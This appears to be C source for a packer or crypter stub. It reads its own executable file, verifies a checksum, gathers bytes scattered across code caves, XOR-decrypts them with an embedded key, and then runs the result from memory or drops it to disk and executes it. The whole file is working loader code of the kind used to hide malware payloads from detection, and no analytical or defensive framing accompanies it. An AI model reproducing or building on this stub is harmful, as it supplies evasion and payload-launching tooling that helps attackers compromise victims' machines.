#include "unpk.h"

VOID
HRTAPI
HrtUnpkInit(
	PHRT_LOCAL_PACK_DATA	Lpd,
	PHRT_UNPACK_DATA		Ud )
{
	HrtMemSet32( Ud,
				 0,
				 SIZEOFREF( Ud ) );
	HrtMemSet32( Lpd,
				 0,
				 SIZEOFREF( Lpd ) );

	Lpd->UnpackData = Ud;
}

V
HRTAPI
HrtUnpkNewChkSum(
	PHRT_UNPACK_DATA Ud )
{
	VV ChkSum = 0;

	if ( !Ud )
		goto Cleanup;

	/*
	*	Get the size of the structure, ommiting the CheckSum field
	*/
	VV		Size	= SIZEOFREF( Ud ) - SIZEOF( Ud->CheckSum );
	PV8		Strt	= ( PV8 ) (Ud);
	PV8		End		= Strt + Size;

	for ( ; Strt < End; ++Strt ) {
		/*
		*	Add current byte to CheckSum
		*/
		ChkSum += *Strt;
	}
	
	/*
	*	Ensure the number is positive in case of integer overflow
	*	Note: Does not apply anymore as we are not adding 32-bit unsigned integers anymore, but 8-bit unsigned chars,
	*	but I will keep this part here
	*/
	ENSURE_POS( ChkSum );

Cleanup:

	HRT_DBG_TRACE( "Returning...\n" );

	return ChkSum;
}

B
HRTAPI
HrtUnpkFindData(
	PHRT_LOCAL_PACK_DATA Lpd )
{
	REGISTER B Status = BAD;

	if ( !Lpd )
		goto ErrorOccured3;

	REGISTER PUC Path = HrtModGetPath( NULL );
	if ( !Path )
		goto ErrorOccured3;

	HRT_DBG_TRACE( "Current file: %ws\n",
				   Path );

	VV File = MyCreateFileW( Path,
							 GENERIC_READ,
							 FILE_SHARE_READ,
							 OPEN_EXISTING );
	if ( INVALID_HANDLE_VALUE == File )
		goto ErrorOccured3;

	VV Size = MyGetFileSize( File );
	if ( !Size )
		goto ErrorOccured2;

	HRT_DBG_TRACE( "Current file size: %d\n",
				   Size );

	VV Base = MyVirtualAlloc( 0,
							  Size,
							  MEM_COMMIT | MEM_RESERVE,
							  PAGE_READWRITE );
	if ( !Base )
		goto ErrorOccured2;

	if ( !MyReadFile( File,
					  Base,
					  Size ) )
		goto ErrorOccured;

	VV StrPos = Size - SIZEOF( HRT_UNPACK_DATA );
	HrtMemCpy( ( PV ) (Base + StrPos),
			   ( PV ) (Lpd->UnpackData),
			   SIZEOF( HRT_UNPACK_DATA ) );

	VV ChkSum = HrtUnpkNewChkSum( Lpd->UnpackData );
	
	HRT_DBG_TRACE( "Current CheckSum: 0x%08X, Old CheckSum: 0x%08X\n",
				   ChkSum,
				   Lpd->UnpackData->CheckSum );

	if ( !ChkSum || ChkSum != Lpd->UnpackData->CheckSum )
		goto ErrorOccured;

	Lpd->Base	= Base;
	Lpd->Size	= Size;

	Status = GOOD;
	goto ErrorOccured2;

ErrorOccured:

	HRT_DBG_TRACE( "Freeing memory...\n" );
	MyVirtualFree( Base,
				   0,
				   MEM_RELEASE );

ErrorOccured2:

	HRT_DBG_TRACE( "Closing file...\n" );
	MyCloseHandle( File );

ErrorOccured3:

	HRT_DBG_TRACE( "Returning...\n" );
	return Status;
}

B
HRTAPI
HrtUnpkFixData(
	PHRT_LOCAL_PACK_DATA Lpd )
{
	REGISTER B Status = BAD;

	if ( !Lpd )
		goto ErrorOccured3;

	/*
	*	Calculate new size and allocate memory
	*/
	Lpd->NewSize	= (Lpd->UnpackData->EndOffset - Lpd->UnpackData->StartOffset);
	Lpd->NewBase	= MyVirtualAlloc( 0,
									  Lpd->NewSize,
									  MEM_COMMIT | MEM_RESERVE,
									  PAGE_READWRITE );
	if ( !Lpd->NewBase )
		goto ErrorOccured3;

	HRT_DBG_TRACE( "File's new size is %dkb\n",
				   (Lpd->NewSize / 1000) );

	/*
	*	Go trough all caves
	*/
	VV NewBaseLocator = Lpd->NewBase;
	for ( VV i = 0; i < HRT_UNPACK_CAVECNT; ++i ) {
		/*
		*	Resolve raw address in memory from the relative address
		*/
		VV CurrCaveStrtBase	= RVA_TO_RAW( Lpd->Base, Lpd->UnpackData->CaveOffsets[i].StartOffset );

		HRT_DBG_TRACE( "[Cave #%d] Raw: 0x%08X (Offset: 0x%08X) @ 0x%08X\n",
					   i,
					   CurrCaveStrtBase,
					   Lpd->UnpackData->CaveOffsets[i].StartOffset,
					   NewBaseLocator );

		/*
		*	Copy the current code
		*/
		HrtMemCpy8( CurrCaveStrtBase,
					NewBaseLocator,
					Lpd->UnpackData->NumberOfPebbles );
		NewBaseLocator += Lpd->UnpackData->NumberOfPebbles;
	}

	/*
	*	Release the original memory
	*/
	MyVirtualFree( Lpd->Base,
				   0,
				   MEM_RELEASE );
	Lpd->Size = 0;
	
	Status = GOOD;
	goto ErrorOccured3;

ErrorOccured3:

	return Status;
}

B
HRTAPI
HrtUnpkDecrData(
	PHRT_LOCAL_PACK_DATA Lpd )
{
	PVV Strt	= ( PV ) (Lpd->NewBase);
	PVV End		= ( PV ) (Lpd->NewBase + Lpd->NewSize);
	VV i		= 0;

	while ( Strt < End ) {
		*Strt++ ^= Lpd->UnpackData->EncryptionKey[i++];
		if ( i == HRT_UNPACK_KEYSIZE )
			i = 0;
	}

	return GOOD;
}

B
HRTAPI
HrtUnpkPerform(
	PHRT_LOCAL_PACK_DATA	Lpd,
	PHRT_UNPACK_DATA		Ud )
{
	REGISTER B Status = BAD;

	if ( !Lpd || !Ud )
		goto ErrorOccured;
	
	HrtUnpkInit( Lpd,
				 Ud );

	if ( !HrtUnpkFindData( Lpd ) )
		goto ErrorOccured;
	
	if ( !HrtUnpkFixData( Lpd ) )
		goto ErrorOccured;

	if ( !HrtUnpkDecrData( Lpd ) )
		goto ErrorOccured;

	Status = GOOD;

ErrorOccured:

	return Status;
}

B
HRTAPI
HrtUnpkRun(
	PHRT_LOCAL_PACK_DATA	Lpd,
	PHRT_UNPACK_DATA		Ud,
	READONLY V				Flags )
{
	REGISTER B Status = BAD;

	if ( !Lpd || !Ud )
		goto ErrorOccured;

	if ( FLAG_SET( Flags,
				   HRT_UNPK_FLAG_RUNINMEM ) ) {
		HRT_DBG_TRACE( "Trying to run from memory...\n" );
		HrtImgTryRunFromMem( Lpd->NewBase );
	} else {
		HRT_DBG_TRACE( "Dropping file on disk...\n" );
		HrtUtilDropAndExec( Lpd->NewBase,
							Lpd->NewSize );
	}

	Status = GOOD;

ErrorOccured:

	return Status;
}

VOID
HRTAPI
HrtUnpkUnpack(
	VOID )
{
	HRT_DBG_TRACE( "Unpacking...\n" );
	
	HRT_LOCAL_PACK_DATA Lpd;
	HRT_UNPACK_DATA Ud;

	if ( !HrtUnpkPerform( &Lpd,
						  &Ud ) )
		HRT_EXIT;

	if ( !HrtUnpkRun( &Lpd,
					  &Ud,
					  Lpd.UnpackData->Flags ) )
		HRT_EXIT;
}